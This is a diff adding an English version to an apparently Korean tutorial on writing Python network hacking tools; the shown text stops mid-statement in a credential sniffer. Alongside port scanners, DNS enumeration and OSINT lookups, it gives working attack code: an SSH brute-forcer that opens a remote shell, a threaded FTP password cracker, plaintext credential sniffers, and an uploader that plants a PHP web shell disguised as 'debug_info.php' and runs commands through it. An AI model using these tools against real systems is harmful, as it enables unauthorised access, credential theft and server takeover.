@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # Python 네트워크 스캐닝 도구 개발
 
 ## 1. 소켓 프로그래밍 기초
@@ -1255,5 +1261,1267 @@ if __name__ == "__main__":
 pip install scapy paramiko requests dnspython python-whois
 
 Scapy 사용 시 root/관리자 권한 필요:
+sudo python3 scanner.py 192.168.1.0/24
+```
+
+---
+
+<a name="english"></a>
+
+# Python Network Scanning Tool Development
+
+## 1. Socket Programming Basics
+
+Use Python's socket module to implement TCP/UDP network communication. This covers the fundamental structure of creating client/server sockets, connecting, and sending/receiving data.
+
+```python
+import socket
+import threading
+from datetime import datetime
+
+# Basic socket connection test
+def check_port(host, port, timeout=1):
+    """Check a single port connection"""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    result = sock.connect_ex((host, port))
+    sock.close()
+    return result == 0  # 0 = success (port is open)
+
+# Usage example
+if check_port("192.168.1.1", 80):
+    print("[+] Port 80 is OPEN")
+```
+
+---
+
+## 2. Multi-threaded Port Scanner
+
+Implement parallel port scanning using the threading module. A thread pool scans multiple ports simultaneously, dramatically increasing speed.
+
+```python
+import socket
+import threading
+import queue
+from datetime import datetime
+
+class PortScanner:
+    def __init__(self, target, start_port=1, end_port=1024, threads=100, timeout=1):
+        self.target = target
+        self.start_port = start_port
+        self.end_port = end_port
+        self.threads = threads
+        self.timeout = timeout
+        self.open_ports = []
+        self.port_queue = queue.Queue()
+        self.lock = threading.Lock()
+
+    def scan_port(self):
+        """Pop a port from the work queue and scan it"""
+        while True:
+            try:
+                port = self.port_queue.get_nowait()
+            except queue.Empty:
+                break
+
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self.timeout)
+            result = sock.connect_ex((self.target, port))
+            sock.close()
+
+            if result == 0:
+                try:
+                    # Look up service name
+                    service = socket.getservbyport(port)
+                except:
+                    service = "unknown"
+                
+                with self.lock:
+                    self.open_ports.append((port, service))
+                    print(f"[+] Port {port:5d} OPEN  ({service})")
+            
+            self.port_queue.task_done()
+
+    def run(self):
+        """Execute the port scan"""
+        print(f"\n[*] Scan start: {self.target}")
+        print(f"[*] Range: {self.start_port} - {self.end_port}")
+        print(f"[*] Start time: {datetime.now().strftime('%H:%M:%S')}")
+        print("-" * 50)
+
+        # Fill the port queue
+        for port in range(self.start_port, self.end_port + 1):
+            self.port_queue.put(port)
+
+        # Start threads
+        thread_list = []
+        for _ in range(min(self.threads, self.end_port - self.start_port + 1)):
+            t = threading.Thread(target=self.scan_port)
+            t.daemon = True
+            thread_list.append(t)
+            t.start()
+
+        # Wait for completion
+        for t in thread_list:
+            t.join()
+
+        print("-" * 50)
+        print(f"[*] End time: {datetime.now().strftime('%H:%M:%S')}")
+        print(f"[*] Open ports: {len(self.open_ports)}")
+        
+        return sorted(self.open_ports)
+
+
+# Banner grabber (service version collection)
+def grab_banner(host, port, timeout=3):
+    """Collect service banner"""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((host, port))
+        
+        # Send request for HTTP
+        if port in [80, 8080, 8000]:
+            sock.send(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
+        elif port == 443:
+            sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
+        
+        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
+        sock.close()
+        return banner[:200]  # First 200 characters
+    except:
+        return None
+
+
+if __name__ == "__main__":
+    import sys
+    
+    if len(sys.argv) < 2:
+        print(f"Usage: python {sys.argv[0]} <target_ip> [start_port] [end_port]")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
+    end = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
+    
+    scanner = PortScanner(target, start, end)
+    open_ports = scanner.run()
+    
+    # Collect banners
+    print("\n[*] Collecting banners...")
+    for port, service in open_ports:
+        banner = grab_banner(target, port)
+        if banner:
+            print(f"    Port {port} ({service}): {banner[:80]}")
+```
+
+---
+
+## 3. Network Host Discovery (ARP Scan)
+
+Scapy is a powerful Python library for directly creating, sending, receiving, and analyzing network packets. It is used to implement low-level network attacks such as ARP spoofing, port scanning, and packet injection in Python code.
+
+```python
+from scapy.all import ARP, Ether, srp
+import ipaddress
+
+def arp_scan(network):
+    """Network host discovery using ARP"""
+    print(f"[*] ARP scan: {network}")
+    
+    # Create ARP request packet
+    arp = ARP(pdst=network)
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = ether / arp
+    
+    # Send packets and collect responses
+    result = srp(packet, timeout=3, verbose=False)[0]
+    
+    hosts = []
+    for sent, received in result:
+        hosts.append({
+            'ip': received.psrc,
+            'mac': received.hwsrc
+        })
+        print(f"[+] {received.psrc:15s}  {received.hwsrc}")
+    
+    print(f"\n[*] Total hosts found: {len(hosts)}")
+    return hosts
+
+
+# ICMP Ping scan (when ARP is unavailable)
+def ping_scan(network):
+    """Host discovery using ICMP"""
+    from scapy.all import IP, ICMP, sr1
+    
+    live_hosts = []
+    net = ipaddress.ip_network(network, strict=False)
+    
+    for ip in net.hosts():
+        ip_str = str(ip)
+        packet = IP(dst=ip_str) / ICMP()
+        reply = sr1(packet, timeout=1, verbose=False)
+        
+        if reply is not None:
+            print(f"[+] {ip_str} is ALIVE")
+            live_hosts.append(ip_str)
+    
+    return live_hosts
+
+
+if __name__ == "__main__":
+    arp_scan("192.168.1.0/24")
+```
+
+---
+
+## 4. Packet Sniffer
+
+Scapy is a powerful Python library for directly creating, sending, receiving, and analyzing network packets. It is used to implement low-level network attacks such as ARP spoofing, port scanning, and packet injection in Python code.
+
+```python
+from scapy.all import sniff, IP, TCP, UDP, DNS, Raw
+import datetime
+
+def packet_callback(packet):
+    """Packet analysis callback"""
+    timestamp = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
+    
+    if packet.haslayer(IP):
+        src_ip = packet[IP].src
+        dst_ip = packet[IP].dst
+        
+        # TCP
+        if packet.haslayer(TCP):
+            sport = packet[TCP].sport
+            dport = packet[TCP].dport
+            flags = packet[TCP].flags
+            
+            # Detect HTTP requests
+            if dport == 80 and packet.haslayer(Raw):
+                payload = packet[Raw].load.decode('utf-8', errors='ignore')
+                if payload.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ')):
+                    lines = payload.split('\r\n')
+                    print(f"[HTTP] {src_ip} → {dst_ip} | {lines[0][:80]}")
+                    return
+            
+            # Detect FTP credentials
+            if dport == 21 and packet.haslayer(Raw):
+                payload = packet[Raw].load.decode('utf-8', errors='ignore').strip()
+                if payload.upper().startswith(('USER ', 'PASS ')):
+                    print(f"[FTP!] {src_ip} → {dst_ip} | {payload}")
+                    return
+            
+            # Detect Telnet
+            if dport == 23 and packet.haslayer(Raw):
+                payload = packet[Raw].load.decode('utf-8', errors='ignore')
+                print(f"[TELNET!] {src_ip} | {repr(payload[:50])}")
+                return
+            
+            # Detect SYN scan
+            if flags == 'S' and dport < 1024:
+                print(f"[SCAN?] {src_ip} → {dst_ip}:{dport} SYN")
+                return
+        
+        # Print DNS queries
+        if packet.haslayer(DNS) and packet[DNS].qr == 0:
+            domain = packet[DNS].qd.qname.decode().rstrip('.')
+            print(f"[DNS] {src_ip} queries: {domain}")
+            return
+    
+    # Default output (IP packets)
+    if packet.haslayer(IP):
+        print(f"[{timestamp}] {packet[IP].src} → {packet[IP].dst} | {packet[IP].proto}")
+
+
+def start_sniffer(interface="eth0", count=0, filter_str=""):
+    """Start the packet sniffer"""
+    print(f"[*] Sniffing started: {interface}")
+    print("[*] Press Ctrl+C to stop")
+    print("-" * 60)
+    
+    sniff(
+        iface=interface,
+        prn=packet_callback,
+        count=count,
+        filter=filter_str,
+        store=False
+    )
+
+
+# Credential-focused sniffer
+def credential_sniffer(interface="eth0"):
+    """Dedicated plaintext credential detection"""
+    print("[*] Credential sniffer (HTTP/FTP/Telnet)")
+    
+    KEYWORDS = [b'username', b'password', b'passwd', b'user=', b'pass=',
+                b'login', b'credential', b'auth', b'USER ', b'PASS ']
+    
+    def check_credentials(packet):
+        if packet.haslayer(Raw):
+            payload = packet[Raw].load.lower()
+            for keyword in KEYWORDS:
+                if keyword.lower() in payload:
+                    src = packet[IP].src if packet.haslayer(IP) else "?"
+                    print(f"[!] Credential detected from {src}:")
+                    print(f"    {packet[Raw].load[:200]}")
+                    break
+    
+    sniff(iface=interface, prn=check_credentials, filter="tcp", store=False)
+```
+
+---
+
+## 5. DNS Enumeration Tool
+
+Enumerate DNS records using the dnspython library. Automates A, MX, NS, TXT record lookups and subdomain brute-forcing.
+
+```python
+import dns.resolver
+import concurrent.futures
+
+def dns_lookup(domain, record_type='A'):
+    """DNS record lookup"""
+    try:
+        answers = dns.resolver.resolve(domain, record_type)
+        return [str(r) for r in answers]
+    except:
+        return []
+
+
+def subdomain_enum(domain, wordlist_file, threads=50):
+    """Subdomain enumeration (DNS brute-forcing)"""
+    found = []
+    
+    def check_subdomain(sub):
+        target = f"{sub}.{domain}"
+        result = dns_lookup(target, 'A')
+        if result:
+            print(f"[+] {target:40s} → {', '.join(result)}")
+            found.append((target, result))
+    
+    print(f"[*] Subdomain enumeration: {domain}")
+    
+    with open(wordlist_file, 'r') as f:
+        subdomains = [line.strip() for line in f if line.strip()]
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+        executor.map(check_subdomain, subdomains)
+    
+    return found
+
+
+def dns_zone_transfer(domain):
+    """DNS zone transfer attempt (AXFR)"""
+    print(f"[*] Zone transfer attempt: {domain}")
+    
+    # Get NS server list
+    ns_records = dns_lookup(domain, 'NS')
+    
+    for ns in ns_records:
+        ns = ns.rstrip('.')
+        print(f"[*] Trying NS server: {ns}")
+        try:
+            zone = dns.zone.from_xfr(dns.query.xfr(ns, domain))
+            print(f"[!] Zone transfer succeeded! NS: {ns}")
+            for name, node in zone.nodes.items():
+                print(f"    {name}.{domain}")
+        except Exception as e:
+            print(f"    [-] Failed: {e}")
+
+
+def reverse_dns_sweep(network):
+    """Reverse DNS lookup (IP → domain)"""
+    import ipaddress
+    
+    net = ipaddress.ip_network(network, strict=False)
+    
+    for ip in net.hosts():
+        ip_str = str(ip)
+        try:
+            result = dns.resolver.resolve_address(ip_str)
+            hostname = str(result[0])
+            print(f"[+] {ip_str:15s} → {hostname}")
+        except:
+            pass
+
+
+# Execution example
+if __name__ == "__main__":
+    domain = "example.com"
+    
+    # Collect A, MX, NS, TXT records
+    for record_type in ['A', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']:
+        results = dns_lookup(domain, record_type)
+        if results:
+            print(f"[{record_type}] {domain}:")
+            for r in results:
+                print(f"    {r}")
+    
+    # Attempt zone transfer
+    dns_zone_transfer(domain)
+```
+
+---
+
+## 6. SSH Brute-Forcer
+
+Implement an SSH brute-force attack using the paramiko SSH library. Attempts SSH credentials using a wordlist.
+
+```python
+import paramiko
+import time
+from queue import Queue
+import threading
+
+class SSHBruteForcer:
+    def __init__(self, target, port=22, threads=5, delay=0.5):
+        self.target = target
+        self.port = port
+        self.threads = threads
+        self.delay = delay  # Rate limiting (controls attempts per second)
+        self.found = False
+        self.credential_queue = Queue()
+        self.lock = threading.Lock()
+
+    def try_login(self, username, password):
+        """Attempt SSH login"""
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+        try:
+            client.connect(
+                self.target, 
+                port=self.port,
+                username=username, 
+                password=password,
+                timeout=5,
+                banner_timeout=5
+            )
+            client.close()
+            return True
+        except paramiko.AuthenticationException:
+            return False
+        except Exception as e:
+            return None  # Connection error
+
+    def worker(self):
+        """Worker thread"""
+        while not self.found:
+            try:
+                username, password = self.credential_queue.get_nowait()
+            except:
+                break
+            
+            time.sleep(self.delay)
+            result = self.try_login(username, password)
+            
+            if result is True:
+                with self.lock:
+                    if not self.found:
+                        self.found = True
+                        print(f"\n[!!!] Success! {username}:{password}")
+                        # Open session
+                        self._open_session(username, password)
+            elif result is None:
+                # Connection error → re-queue
+                self.credential_queue.put((username, password))
+            else:
+                print(f"[-] Failed: {username}:{password[:3]}***")
+            
+            self.credential_queue.task_done()
+
+    def _open_session(self, username, password):
+        """Execute commands with successful credentials"""
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(self.target, port=self.port, 
+                       username=username, password=password)
+        
+        print("\n[*] Starting interactive session (type 'exit' to quit)")
+        while True:
+            cmd = input(f"{username}@{self.target}$ ")
+            if cmd.lower() == 'exit':
+                break
+            stdin, stdout, stderr = client.exec_command(cmd)
+            print(stdout.read().decode())
+            err = stderr.read().decode()
+            if err:
+                print(f"[STDERR] {err}")
+        
+        client.close()
+
+    def run(self, usernames_file, passwords_file):
+        """Run the brute-force attack"""
+        print(f"[*] SSH brute-force: {self.target}:{self.port}")
+        
+        with open(usernames_file) as uf, open(passwords_file) as pf:
+            users = [u.strip() for u in uf]
+            passwords = [p.strip() for p in pf]
+        
+        # Build credential combination queue
+        for user in users:
+            for pwd in passwords:
+                self.credential_queue.put((user, pwd))
+        
+        print(f"[*] Total attempts: {self.credential_queue.qsize()}")
+        
+        # Start threads
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=self.worker)
+            t.daemon = True
+            threads.append(t)
+            t.start()
+        
+        for t in threads:
+            t.join()
+        
+        if not self.found:
+            print("[-] No valid credentials found")
+```
+
+---
+
+## 7. Vulnerability Scanner (CVE-based)
+
+A socket-based CVE vulnerability scanner. Uses banner grabbing to identify service versions and matches them against a known vulnerability database.
+
+```python
+import socket
+import re
+import requests
+
+class VulnScanner:
+    """Simple vulnerability scanner"""
+    
+    def __init__(self, target):
+        self.target = target
+        self.results = []
+
+    def check_ftp_anonymous(self, port=21):
+        """Check for FTP anonymous login"""
+        try:
+            sock = socket.socket()
+            sock.settimeout(5)
+            sock.connect((self.target, port))
+            banner = sock.recv(1024).decode()
+            
+            sock.send(b"USER anonymous\r\n")
+            resp = sock.recv(1024).decode()
+            sock.send(b"PASS anonymous@test.com\r\n")
+            resp = sock.recv(1024).decode()
+            sock.close()
+            
+            if "230" in resp:  # 230 = login success
+                print(f"[VULN] FTP anonymous login allowed! ({self.target}:{port})")
+                self.results.append(("FTP Anonymous", "HIGH", port))
+        except:
+            pass
+
+    def check_http_headers(self, port=80):
+        """Check HTTP security headers"""
+        try:
+            r = requests.get(f"http://{self.target}:{port}", timeout=5, verify=False)
+            headers = r.headers
+            
+            missing = []
+            security_headers = [
+                'X-XSS-Protection',
+                'X-Frame-Options',
+                'X-Content-Type-Options',
+                'Strict-Transport-Security',
+                'Content-Security-Policy'
+            ]
+            
+            for header in security_headers:
+                if header not in headers:
+                    missing.append(header)
+            
+            if missing:
+                print(f"[INFO] Missing security headers: {', '.join(missing)}")
+            
+            # Server version disclosure
+            if 'Server' in headers:
+                server = headers['Server']
+                print(f"[INFO] Server version disclosed: {server}")
+                
+                # Vulnerable Apache version
+                match = re.search(r'Apache/(\d+\.\d+\.\d+)', server)
+                if match:
+                    version = match.group(1)
+                    print(f"[VULN?] Apache {version} — CVE check required")
+        except:
+            pass
+
+    def check_smb_ms17_010(self, port=445):
+        """Check for EternalBlue (MS17-010) vulnerability"""
+        try:
+            # NetBIOS session request
+            sock = socket.socket()
+            sock.settimeout(5)
+            sock.connect((self.target, port))
+            
+            # SMB Negotiate Protocol Request
+            negotiate = (
+                b'\x00\x00\x00\x54'  # NetBIOS
+                b'\xff\x53\x4d\x42'  # SMB Header
+                b'\x72\x00\x00\x00'
+                b'\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00'
+                b'\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00'
+                b'\x00\x31\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e'
+                b'\x30\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32'
+                b'\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32'
+                b'\x00\x02\x53\x4d\x42\x20\x32\x2e\x30\x30\x32\x00'
+            )
+            sock.send(negotiate)
+            response = sock.recv(1024)
+            sock.close()
+            
+            if b'\xff\x53\x4d\x42' in response:
+                print(f"[INFO] SMB service confirmed: {self.target}:{port}")
+                # Actual MS17-010 check requires more complex packet exchange
+        except:
+            pass
+
+    def run(self):
+        """Run the full scan"""
+        print(f"[*] Vulnerability scan: {self.target}")
+        self.check_ftp_anonymous()
+        self.check_http_headers()
+        self.check_smb_ms17_010()
+        
+        if self.results:
+            print(f"\n[*] Vulnerabilities found: {len(self.results)}")
+            for name, severity, port in self.results:
+                print(f"    [{severity}] {name} (Port {port})")
+        else:
+            print("[-] No clear vulnerabilities found")
+```
+
+---
+
+## 8. Practical OSINT Toolkit
+
+An automated OSINT tool. Collects publicly available information about a target using the Shodan, Censys, and VirusTotal APIs.
+
+```python
+import requests
+import json
+
+class OSINTTools:
+    """Online OSINT collection tool"""
+    
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
+
+    def check_ip_reputation(self, ip):
+        """Check IP reputation (AbuseIPDB)"""
+        # API key required: https://www.abuseipdb.com/
+        headers = {
+            'Accept': 'application/json',
+            'Key': 'YOUR_API_KEY'
+        }
+        params = {'ipAddress': ip, 'maxAgeInDays': '90'}
+        
+        try:
+            r = requests.get(
+                'https://api.abuseipdb.com/api/v2/check',
+                headers=headers, params=params, timeout=10
+            )
+            data = r.json()['data']
+            print(f"IP: {ip}")
+            print(f"  Malicious reports: {data['totalReports']}")
+            print(f"  Abuse confidence score: {data['abuseConfidenceScore']}%")
+            print(f"  Country: {data['countryCode']}")
+            print(f"  ISP: {data['isp']}")
+        except Exception as e:
+            print(f"Error: {e}")
+
+    def shodan_search(self, api_key, query):
+        """Shodan search"""
+        # pip install shodan
+        import shodan
+        api = shodan.Shodan(api_key)
+        
+        results = api.search(query)
+        print(f"[*] Search results: {results['total']}")
+        
+        for result in results['matches'][:10]:
+            print(f"\n[+] {result['ip_str']}:{result['port']}")
+            print(f"    Organization: {result.get('org', 'N/A')}")
+            print(f"    Location: {result.get('location', {}).get('country_name', 'N/A')}")
+            print(f"    Banner: {result.get('data', '')[:100]}")
+
+    def whois_lookup(self, domain):
+        """Whois lookup"""
+        import whois  # pip install python-whois
+        w = whois.whois(domain)
+        print(f"Domain: {domain}")
+        print(f"Registrant: {w.registrant_name}")
+        print(f"Created: {w.creation_date}")
+        print(f"Expires: {w.expiration_date}")
+        print(f"Name servers: {w.name_servers}")
+
+
+# Execution
+if __name__ == "__main__":
+    # Port scanner
+    scanner = PortScanner("192.168.1.1", 1, 1024)
+    open_ports = scanner.run()
+    
+    # DNS enumeration
+    dns_zone_transfer("example.com")
+    
+    print("\n[*] All scans complete")
+```
+
+---
+
+---
+
+## 9. Original Network Hacking Examples
+
+### Example 7-1: Port Scanning — Port scan and protocol/service output using the nmap library
+```python
+import sys
+import os
+import socket
+import nmap                                                        #(1)
+
+nm = nmap.PortScanner()                                            #(2)
+
+nm.scan('server', '1-1024')                                        #(3)
+
+for host in nm.all_hosts():                                        #(4)
+    print('----------------------------------------------------')
+    print('Host : {0} ({1})'.format(host, nm[host].hostname()))    #(5)
+    print('State : {0}'.format(nm[host].state()))                  #(6)
+
+    for proto in nm[host].all_protocols():                         #(7)
+        print('----------')
+        print('Protocol : {0}'.format(proto))                        
+
+        lport = list(nm[host][proto].keys())                       #(8)
+        lport.sort()
+        for port in lport:
+            print('port : {0}\tstate : {1}'.format(port, nm[host][proto][port]))   #(9)
+print('----------------------------------------------------')
+```
+
+### Example 7-2: FTP Password Cracking — Multi-threaded FTP brute-forcer (Python 3.10+)
+```python
+#!/usr/bin/env python3
+"""
+Multi-threaded FTP Brute-Forcer (Python 3.10+)
+Purpose: Dictionary attack against FTP services (authorized systems only)
+Usage: python3 ftp_crack.py <host> <user> <wordlist> [--threads 10]
+"""
+from __future__ import annotations
+import argparse
+import ftplib
+import queue
+import threading
+import sys
+from pathlib import Path
+
+
+def try_ftp_login(host: str, port: int, username: str, password: str, timeout: int = 5) -> bool:
+    """Attempt FTP login. Returns True on success."""
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=timeout)
+        ftp.login(username, password)
+        ftp.quit()
+        return True
+    except ftplib.error_perm:
+        return False
+    except Exception:
+        return False
+
+
+def list_ftp_tree(host: str, port: int, username: str, password: str,
+                  target_dir: str = "htdocs") -> list[str]:
+    """Connect via FTP and recursively traverse directories, collecting paths containing target_dir."""
+    found: list[str] = []
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=10)
+        ftp.login(username, password)
+
+        def walk(path: str) -> None:
+            try:
+                entries = ftp.nlst(path) if path else ftp.nlst()
+            except ftplib.error_perm:
+                return
+            for entry in entries:
+                if "." not in Path(entry).name:   # Treat as directory
+                    if target_dir.lower() in entry.lower():
+                        found.append(entry)
+                        print(f"  [!] {entry}")
+                    walk(entry)
+
+        walk("")
+        ftp.quit()
+    except Exception as exc:
+        print(f"[!] FTP traversal error: {exc}", file=sys.stderr)
+    return found
+
+
+class FTPBruteForcer:
+    def __init__(self, host: str, port: int, username: str,
+                 wordlist: str, n_threads: int = 10) -> None:
+        self.host = host
+        self.port = port
+        self.username = username
+        self.n_threads = n_threads
+        self._found_event = threading.Event()
+        self._found_password: str | None = None
+        self._lock = threading.Lock()
+        self._queue: queue.Queue[str] = queue.Queue()
+
+        with Path(wordlist).open(encoding="utf-8", errors="replace") as fh:
+            for line in fh:
+                pw = line.strip()
+                if pw:
+                    self._queue.put(pw)
+
+        print(f"[*] Target: {host}:{port}  User: {username}")
+        print(f"[*] Passwords to try: {self._queue.qsize()}  Threads: {n_threads}")
+
+    def _worker(self) -> None:
+        while not self._found_event.is_set():
+            try:
+                password = self._queue.get_nowait()
+            except queue.Empty:
+                return
+            if try_ftp_login(self.host, self.port, self.username, password):
+                with self._lock:
+                    if not self._found_event.is_set():
+                        self._found_password = password
+                        self._found_event.set()
+                        print(f"\n[+] Password found: {self.username}:{password}")
+            else:
+                print(f"\r[-] {password:<30}", end="", flush=True)
+            self._queue.task_done()
+
+    def run(self) -> str | None:
+        threads = [
+            threading.Thread(target=self._worker, daemon=True)
+            for _ in range(self.n_threads)
+        ]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+        if not self._found_password:
+            print("\n[-] Password not found.")
+        return self._found_password
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="Multi-threaded FTP Brute-Forcer")
+    parser.add_argument("host", help="FTP server address")
+    parser.add_argument("user", help="Username")
+    parser.add_argument("wordlist", help="Password list file")
+    parser.add_argument("--port", type=int, default=21, help="FTP port (default: 21)")
+    parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)")
+    args = parser.parse_args()
+
+    cracker = FTPBruteForcer(args.host, args.port, args.user, args.wordlist, args.threads)
+    cracker.run()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Example 7-3: Directory Listing — FTP recursive traversal and web root detection (Python 3.10+)
+```python
+#!/usr/bin/env python3
+"""
+FTP Recursive Directory Explorer (Python 3.10+)
+Purpose: Locate web root directories (htdocs, www, public_html, etc.) on FTP servers
+Usage: python3 ftp_tree.py <host> <user> <pass> [--target htdocs]
+"""
+from __future__ import annotations
+import argparse
+import ftplib
+import sys
+
+
+WEBROOT_CANDIDATES = ["htdocs", "www", "public_html", "webroot", "html", "site"]
+
+
+def ftp_recursive_list(
+    ftp: ftplib.FTP,
+    path: str = "",
+    depth: int = 0,
+    max_depth: int = 5,
+    target_dirs: list[str] | None = None,
+) -> list[str]:
+    """Recursively traverse FTP directories, returning a list of matched paths."""
+    if depth > max_depth:
+        return []
+
+    targets = target_dirs or WEBROOT_CANDIDATES
+    found: list[str] = []
+    prefix = "  " * depth
+
+    try:
+        entries = ftp.nlst(path) if path else ftp.nlst()
+    except ftplib.error_perm as e:
+        if "550" in str(e):
+            return []
+        raise
+
+    for entry in entries:
+        name = entry.rsplit("/", 1)[-1]
+        # Treat as directory if no extension (simple heuristic)
+        is_dir = "." not in name
+
+        for keyword in targets:
+            if keyword.lower() in entry.lower():
+                print(f"{prefix}[!] Found: {entry}")
+                found.append(entry)
+
+        print(f"{prefix}{entry}")
+
+        if is_dir:
+            found.extend(
+                ftp_recursive_list(ftp, entry, depth + 1, max_depth, targets)
+            )
+
+    return found
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="FTP Recursive Directory Explorer")
+    parser.add_argument("host", help="FTP server address")
+    parser.add_argument("user", help="FTP username")
+    parser.add_argument("password", help="FTP password")
+    parser.add_argument("--port", type=int, default=21)
+    parser.add_argument("--target", nargs="+", default=WEBROOT_CANDIDATES,
+                        help="Directory keywords to search for")
+    parser.add_argument("--depth", type=int, default=5, help="Maximum traversal depth (default: 5)")
+    args = parser.parse_args()
+
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(args.host, args.port, timeout=10)
+        ftp.login(args.user, args.password)
+        print(f"[+] FTP connected: {args.host}:{args.port}")
+        print(f"[*] Starting recursive traversal (max depth: {args.depth})")
+        found = ftp_recursive_list(ftp, "", max_depth=args.depth, target_dirs=args.target)
+        ftp.quit()
+        print(f"\n[*] Web root candidates: {len(found)}")
+        for p in found:
+            print(f"  {p}")
+    except Exception as exc:
+        print(f"[!] Error: {exc}", file=sys.stderr)
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Example 7-4: FTP Web Shell Attack — Web shell upload + execution verification (Python 3.10+)
+```python
+#!/usr/bin/env python3
+"""
+FTP Web Shell Upload Tool (Python 3.10+, authorized environments only)
+Usage: python3 ftp_shell_upload.py <host> <user> <pass> <remote_dir>
+"""
+from __future__ import annotations
+import argparse
+import ftplib
+import io
+import sys
+
+import requests
+
+WEBSHELL_CONTENT = b'<?php if(isset($_GET["cmd"])){system(htmlspecialchars_decode($_GET["cmd"]));} ?>'
+SHELL_NAME = "debug_info.php"
+
+
+def upload_webshell(
+    host: str, port: int, username: str, password: str,
+    remote_dir: str, shell_name: str = SHELL_NAME,
+) -> bool:
+    """Upload web shell via FTP. Returns True on success."""
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=10)
+        ftp.login(username, password)
+        ftp.cwd(remote_dir)
+        ftp.storbinary(f"STOR {shell_name}", io.BytesIO(WEBSHELL_CONTENT))
+        ftp.quit()
+        print(f"[+] Web shell uploaded: {remote_dir}/{shell_name}")
+        return True
+    except Exception as exc:
+        print(f"[!] Upload failed: {exc}", file=sys.stderr)
+        return False
+
+
+def verify_and_exec(base_url: str, shell_name: str, command: str = "id") -> str | None:
+    """Verify command execution via the uploaded web shell."""
+    url = f"{base_url.rstrip('/')}/{shell_name}"
+    try:
+        r = requests.get(url, params={"cmd": command}, timeout=10)
+        if r.status_code == 200 and r.text.strip():
+            print(f"[+] Web shell response: {r.text.strip()[:200]}")
+            return r.text.strip()
+        print(f"[-] No web shell response (HTTP {r.status_code})")
+    except requests.RequestException as exc:
+        print(f"[!] Request failed: {exc}", file=sys.stderr)
+    return None
+
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description="FTP Web Shell Upload Tool (authorized environments only)")
+    parser.add_argument("host", help="FTP server address")
+    parser.add_argument("user", help="FTP username")
+    parser.add_argument("password", help="FTP password")
+    parser.add_argument("remote_dir", help="Upload path (e.g. APM_Setup/htdocs)")
+    parser.add_argument("--port", type=int, default=21)
+    parser.add_argument("--web-url", help="Web access URL (for verification, e.g. http://target.com)")
+    parser.add_argument("--shell-name", default=SHELL_NAME)
+    args = parser.parse_args()
+
+    ok = upload_webshell(args.host, args.port, args.user, args.password,
+                         args.remote_dir, args.shell_name)
+    if ok and args.web_url:
+        verify_and_exec(args.web_url, args.shell_name)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Example 7-5: Packet Sniffing — Scapy-based credential detector (Python 3.10+)
+```python
+#!/usr/bin/env python3
+"""
+Plaintext Protocol Credential Sniffer (Python 3.10+)
+Purpose: Real-time detection of plaintext credentials over HTTP/FTP/Telnet
+Dependencies: pip install scapy
+Usage: sudo python3 cred_sniffer.py -i eth0
+"""
+from __future__ import annotations
+import argparse
+import re
+import sys
+
+try:
+    from scapy.all import IP, Raw, TCP, sniff
+except ImportError:
+    print("[!] Missing dependency: pip install scapy", file=sys.stderr)
+    sys.exit(1)
+
+
+# Detection patterns (protocol, pattern, description)
+PATTERNS: list[tuple[str, re.Pattern, str]] = [
+    ("FTP",    re.compile(rb"(?i)^(USER|PASS) (.+)\r\n"),         "FTP credentials"),
+    ("HTTP",   re.compile(rb"(?i)(username|password|passwd|pwd|login)=[^&\s]+"), "HTTP form data"),
+    ("Telnet", re.compile(rb"[A-Za-z0-9!@#$%]{3,}"),              "Telnet input"),
+    ("SMTP",   re.compile(rb"(?i)^AUTH .+\r\n"),                   "SMTP authentication"),
+]
+
+CRED_PORTS = {21, 23, 25, 80, 110, 143, 8080}
+
+
+def packet_handler(pkt) -> None:
+    if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
+        return
+
+    src_ip: str = pkt[IP].src
+    dst_ip: str = pkt[IP].dst
+    dport: int = pkt[TCP].dport
+    sport: int = pkt[TCP].sport
+    payload: bytes = bytes(pkt[Raw].load)
+
+    if not payload:
+        return
+
+    direction = f"{src_ip}:{sport} → {dst_ip}:{dport}"
+
+    for proto, pattern, desc in PATTERNS:
+        # Port filter (Telnet on 23, HTTP on 80/8080)
+        relevant_port = (
